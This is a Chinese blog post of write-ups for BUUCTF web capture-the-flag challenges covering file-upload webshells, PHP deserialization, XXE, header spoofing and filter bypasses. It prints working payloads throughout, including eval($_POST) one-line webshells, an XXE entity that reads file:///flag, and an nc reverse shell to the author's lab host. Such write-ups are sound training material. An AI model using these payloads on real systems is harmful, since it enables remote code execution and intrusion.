<p>第一步：md5强类型比较绕过，前几天刚遇到过,直接拿过来用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;gg=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><br>第二步：弱类型比较<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd=1234567zx</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Ez_bypass/easy_bypass.jpg" alt=""></p>
<h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>先上传phtml文件<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload0.jpg" alt=""><br>把ph过滤了，那没法用php相关后缀的马了<br>尝试上传.htaccess<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload1.jpg" alt=""><br>然后上传个图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload2.jpg" alt=""><br>啊这，根据以往经验，应该是过滤了&lt;?，改用js调用php的图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload3.jpg" alt=""><br>蚁剑直接连，在根目录发现flag,最初是想直接在终端cat出来，但是命令行被ban了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/BabyUpload/BabyUpload4.jpg" alt=""></p>
<h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>普通马被过滤,看一下服务器，是Apache<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend0.jpg" alt=""><br>上传.htaccess<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend1.jpg" alt=""><br>然后上传图片马<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/YouSendYouMa/yousend2.jpg" alt=""><br>蚁剑直接连，根目录发现flag</p>
<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb0.jpg" alt=""><br>对date()函数报了一些警告，用burp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb1.jpg" alt=""><br>可以看出参数func就是调用的函数名<br>date():<a href="https://www.w3school.com.cn/php/func_date_date.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_date_date.asp</a><br>了解一下date()函数后，可以看出参数p应该就是被调用函数的参数<br>那么可以尝试读取一下index.php<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb2.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$disable_fun</span> = array(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span>,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span>,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span>,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span>,  <span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span>,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span>,<span class="string">"array_walk"</span>, <span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line">    <span class="keyword">function</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">"string"</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="built_in">return</span> <span class="string">""</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var <span class="variable">$p</span> = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">        var <span class="variable">$func</span> = <span class="string">"date"</span>;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">                <span class="built_in">echo</span> gettime(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">"func"</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != null) &#123;</span><br><span class="line">        <span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="built_in">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="string">"Hacker..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>禁用了一大堆函数，但是有个很特别的东西：Test类中的两个成员属性恰好是要传入的参数名，且在类中有个<strong>destruct()魔术方法，会在反序列化结束时调用,在</strong>destruct()里面调用了gettime(),其参数就是Test类的两个成员属性,而且gettime并没有过滤disable_fun,这就很nice,可以通过反序列化函数unserialize()执行__destruct()函数，从而调用gettime函数，达到执行命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">        var <span class="variable">$p</span> = <span class="string">"ls"</span>;</span><br><span class="line">        var <span class="variable">$func</span> = <span class="string">"system"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$a</span>=new Test();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">func=unserialize&amp;p=O:4:<span class="string">"Test"</span>:2:&#123;s:1:<span class="string">"p"</span>;s:2:<span class="string">"ls"</span>;s:4:<span class="string">"func"</span>;s:6:<span class="string">"system"</span>;&#125;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb3.jpg" alt=""><br>可以看到执行成功了，但是没发现flag,去根目录下找找<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb4.jpg" alt=""><br>还是没有。。。，最后在tmp下找到了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb5.jpg" alt=""><br>cat一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/phpweb/phpweb6.jpg" alt=""></p>
<h3 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h3><p>查看源码，发现xml<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">doLogin</span></span>()&#123;</span><br><span class="line">	var username = $(<span class="string">"#username"</span>).val();</span><br><span class="line">	var password = $(<span class="string">"#password"</span>).val();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">		alert(<span class="string">"Please enter the username and password!"</span>);</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	var data = <span class="string">"&lt;user&gt;&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;/user&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="built_in">type</span>: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"doLogin.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml;charset=utf-8"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: <span class="string">"xml"</span>,</span><br><span class="line">        anysc: <span class="literal">false</span>,</span><br><span class="line">        success: <span class="keyword">function</span> (result) &#123;</span><br><span class="line">        	var code = result.getElementsByTagName(<span class="string">"code"</span>)[0].childNodes[0].nodevalue;</span><br><span class="line">        	var msg = result.getElementsByTagName(<span class="string">"msg"</span>)[0].childNodes[0].nodevalue;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">"0"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login fail!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">"1"</span>)&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(msg + <span class="string">" login success!"</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">".msg"</span>).text(<span class="string">"error:"</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="keyword">function</span> (XMLHttpRequest,textStatus,errorThrown) &#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以想到xxe，burp抓个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/FakeXMLcookbook/Fakecookbook0.jpg" alt=""><br>构造一个外部实体，让它包含flag，将flag读出来,因为flag一般都在根目录，所以这里就直接读取file:///flag<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE zx [</span><br><span class="line">&lt;!ENTITY w1ndy SYSTEM <span class="string">"file:///flag"</span>&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;w1ndy;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/FakeXMLcookbook/Fakecookbook1.jpg" alt=""></p>
<h3 id="BJDCTF-2nd-Schrödinger"><a href="#BJDCTF-2nd-Schrödinger" class="headerlink" title="[BJDCTF 2nd]Schrödinger"></a>[BJDCTF 2nd]Schrödinger</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger1.jpg" alt=""><br>查看下源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger2.jpg" alt=""><br>访问一下test.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger3.jpg" alt=""><br>根据首页的介绍，如果一个页面里有参数，就可以爆破，时间越长，爆破成功几率越大，如果点击check，就会停止爆破，结束进程。那这个页面就需要知道admin的密码，那就可以用首页那个工具来爆破这个密码<br>在工具框里输入：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://f2071973-205b-4598-81eb-84bdc383057e.node3.buuoj.cn/test.php</span><br></pre></td></tr></table></figure><br>点击input后开始爆破，刚开始我还傻傻的等，是真的慢。然后就点击了check<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger4.jpg" alt=""><br>感觉问题没这么简单，不可能让我们一直等吧。用burp抓了个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger5.jpg" alt=""><br>第二个参数很像是base64编码，尝试解码，解码后是1594447625，像是时间戳,转换一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger6.jpg" alt=""><br>还真是时间戳,尝试修改值为10(base64编码一下):MTA%3D,forward后弹出一个窗口<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger7.jpg" alt=""><br>av11664517，B站av号，后面的应该是时间戳，转换一下：2020-03-12 11:53:23<br>去B站搜一下,是个讲量子力学的视频，那个时间猜测是评论的时间<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/schrodinger/schrodinger8.jpg" alt=""></p>
<h3 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="[BJDCTF 2nd]duangShell"></a>[BJDCTF 2nd]duangShell</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell0.jpg" alt=""><br>.swp源码泄露,访问.index.php.swp,下载下来后用需要恢复，命令如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure><br>恢复之后打开，就是源码了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'girl_friend'</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    die(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$girl</span> = <span class="variable">$_POST</span>[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, <span class="variable">$girl</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, <span class="variable">$girl</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        //duangShell~~~~</span><br><span class="line">        <span class="built_in">exec</span>(<span class="variable">$girl</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这过滤的让人无从下手啊，看了师傅们的wp,说说是反弹shell,涨姿势了<br>因为需要用到另一台机器，就在BUU上申请了个小号，开了一台linux labs实验机<br>xshell连一下：用户名：root,密码：123456,主机：node3.buuoj.cn，端口是随机分配的，我这里的端口是27369<br>连上之后，查看一下实验机的ip,我这台是174.2.44.59,然后监听一下端口，我这选择监听4444端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><br>然后在题目那里post数据<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">girl_friend=nc 174.2.44.59 4444 -e /bin/bash</span><br></pre></td></tr></table></figure><br>然后实验机这边就会监听到<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell1.jpg" alt=""><br>找一下flag<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell2.jpg" alt=""><br>cat一下flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/duangShell/duanShell3.jpg" alt=""></p>
<h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite0.jpg" alt=""><br>查看源码,发现js代码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite1.jpg" alt=""><br>很明显有个flag.php,直接去访问<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite2.jpg" alt=""><br>除了购买者和他自己的ip能通过，别的无法通过，很容易想到伪造X-Forwarded-For:127.0.0.1<br>我这里用的是个插件X-Forwarded-For Header<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/PYWebsite/PYWebsite3.jpg" alt=""></p>
<h3 id="BJDCTF-2nd-elementmaster"><a href="#BJDCTF-2nd-elementmaster" class="headerlink" title="[BJDCTF 2nd]elementmaster"></a>[BJDCTF 2nd]elementmaster</h3><p>这个题脑洞有点大啊，看了大佬的wp深感佩服<br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster0.jpg" alt=""><br>可以看到,hidden的id是16进制的，解码后为Po.，尝试访问Po.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster1.jpg" alt=""><br>Po是一种化学元素，中文名为钋，根据题目，大佬说是要遍历元素周期表了，写个脚本跑一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=<span class="string">'http://18bffb99-f7e6-4e79-a76b-0e4ab899a2b1.node3.buuoj.cn/'</span></span><br><span class="line">elements=[<span class="string">'H'</span>, <span class="string">'He'</span>, <span class="string">'Li'</span>, <span class="string">'Be'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'F'</span>, <span class="string">'Ne'</span>, <span class="string">'Na'</span>, <span class="string">'Mg'</span>, <span class="string">'Al'</span>, <span class="string">'Si'</span>, <span class="string">'P'</span>, <span class="string">'S'</span>, <span class="string">'Cl'</span>, <span class="string">'Ar'</span>,</span><br><span class="line">        <span class="string">'K'</span>, <span class="string">'Ca'</span>, <span class="string">'Sc'</span>, <span class="string">'Ti'</span>, <span class="string">'V'</span>, <span class="string">'Cr'</span>, <span class="string">'Mn'</span>, <span class="string">'Fe'</span>, <span class="string">'Co'</span>, <span class="string">'Ni'</span>, <span class="string">'Cu'</span>, <span class="string">'Zn'</span>, <span class="string">'Ga'</span>, <span class="string">'Ge'</span>, <span class="string">'As'</span>, <span class="string">'Se'</span>, <span class="string">'Br'</span>,</span><br><span class="line">        <span class="string">'Kr'</span>, <span class="string">'Rb'</span>, <span class="string">'Sr'</span>, <span class="string">'Y'</span>, <span class="string">'Zr'</span>, <span class="string">'Nb'</span>, <span class="string">'Mo'</span>, <span class="string">'Te'</span>, <span class="string">'Ru'</span>, <span class="string">'Rh'</span>, <span class="string">'Pd'</span>, <span class="string">'Ag'</span>, <span class="string">'Cd'</span>, <span class="string">'In'</span>, <span class="string">'Sn'</span>, <span class="string">'Sb'</span>, <span class="string">'Te'</span>,</span><br><span class="line">        <span class="string">'I'</span>, <span class="string">'Xe'</span>, <span class="string">'Cs'</span>, <span class="string">'Ba'</span>, <span class="string">'La'</span>, <span class="string">'Ce'</span>, <span class="string">'Pr'</span>, <span class="string">'Nd'</span>, <span class="string">'Pm'</span>, <span class="string">'Sm'</span>, <span class="string">'Eu'</span>, <span class="string">'Gd'</span>, <span class="string">'Tb'</span>, <span class="string">'Dy'</span>, <span class="string">'Ho'</span>, <span class="string">'Er'</span>, <span class="string">'Tm'</span>,</span><br><span class="line">        <span class="string">'Yb'</span>, <span class="string">'Lu'</span>, <span class="string">'Hf'</span>, <span class="string">'Ta'</span>, <span class="string">'W'</span>, <span class="string">'Re'</span>, <span class="string">'Os'</span>, <span class="string">'Ir'</span>, <span class="string">'Pt'</span>, <span class="string">'Au'</span>, <span class="string">'Hg'</span>, <span class="string">'Tl'</span>, <span class="string">'Pb'</span>, <span class="string">'Bi'</span>, <span class="string">'Po'</span>, <span class="string">'At'</span>, <span class="string">'Rn'</span>,</span><br><span class="line">        <span class="string">'Fr'</span>, <span class="string">'Ra'</span>, <span class="string">'Ac'</span>, <span class="string">'Th'</span>, <span class="string">'Pa'</span>, <span class="string">'U'</span>, <span class="string">'Np'</span>, <span class="string">'Pu'</span>, <span class="string">'Am'</span>, <span class="string">'Cm'</span>, <span class="string">'Bk'</span>, <span class="string">'Cf'</span>, <span class="string">'Es'</span>, <span class="string">'Fm'</span>,<span class="string">'Md'</span>, <span class="string">'No'</span>, <span class="string">'Lr'</span>,</span><br><span class="line">        <span class="string">'Rf'</span>, <span class="string">'Db'</span>, <span class="string">'Sg'</span>, <span class="string">'Bh'</span>, <span class="string">'Hs'</span>, <span class="string">'Mt'</span>, <span class="string">'Ds'</span>, <span class="string">'Rg'</span>, <span class="string">'Cn'</span>, <span class="string">'Nh'</span>, <span class="string">'Fl'</span>, <span class="string">'Mc'</span>, <span class="string">'Lv'</span>, <span class="string">'Ts'</span>, <span class="string">'Og'</span>, <span class="string">'Uue'</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> elements:</span><br><span class="line">    r=requests.get(url+i+<span class="string">'.php'</span>)</span><br><span class="line">    <span class="keyword">if</span>(r.status_code==200):</span><br><span class="line">        flag+=r.text</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster2.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/elementmaster/elementmaster3.jpg" alt=""></p>
<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;40)&#123;</span><br><span class="line">        die(<span class="string">"This is too Long."</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        die(<span class="string">"NO."</span>);</span><br><span class="line">    @<span class="built_in">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
<p>字母数字全都过滤了，考虑urlencode取反绕过<br>先看一下phpinfo()<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> urlencode(~<span class="string">'phpinfo'</span>);</span><br><span class="line">?&gt;</span><br><span class="line">结果：%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><br>payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME0.jpg" alt=""><br>禁了很多系统函数，同样的构造取反一句话<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$a</span> = urlencode(~<span class="string">'assert'</span>);</span><br><span class="line"><span class="variable">$b</span> = urlencode(~<span class="string">'(eval($_POST["w1ndy"]))'</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'?code=(~'</span>.<span class="variable">$a</span>.<span class="string">')'</span>.<span class="string">'(~'</span>.<span class="variable">$b</span>.<span class="string">');'</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%88%CE%91%9B%86%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure><br>蚁剑连上后，因为shell命令被ban了，所以没法直接打开文件，终端也无法使用，我们需要绕过disable_functions,蚁剑刚好有一个这样的插件，但是蚁剑的插件中心挂掉了，一直加载不出来，在网上找到了解决办法<br><a href="https://github.com/Medicean/as_bypass_php_disable_functions/tree/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2" target="_blank" rel="noopener">https://github.com/Medicean/as_bypass_php_disable_functions/tree/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2</a><br>下载下来解压后将其放到antData/plugins目录下，重启蚁剑，就能看见插件了<br>接下来使用该插件来绕过disable_functions<br>右键目标项，加载插件—&gt;辅助工具—&gt;目标插件<br>进入后，选择模式，这里选择PHP_GC_UAF<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME1.jpg" alt=""><br>点击开始，就会进入终端<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/RCEME/RCEME2.jpg" alt=""></p>
<h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap0.jpg" alt=""><br>这个和之前做的OnlineTool很像，直接把payload拿过来测试一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'&lt;?php @eval($_POST["pass"]); ?&gt; -oG test.php'</span></span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Nmap/nmap1.jpg" alt=""><br>猜测过滤了&lt;?,用js来调用php<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'&lt;script language=‘php‘&gt;@eval($_POST['</span>pass<span class="string">']);&lt;/script&gt; -oG test.php'</span></span><br></pre></td></tr></table></figure><br>结果还是一样，那就应该是过滤了php,使用短标签绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">'&lt;?= @eval($_POST["pass"]);?&gt; -oG test.phtml'</span></span><br></pre></td></tr></table></figure><br><img 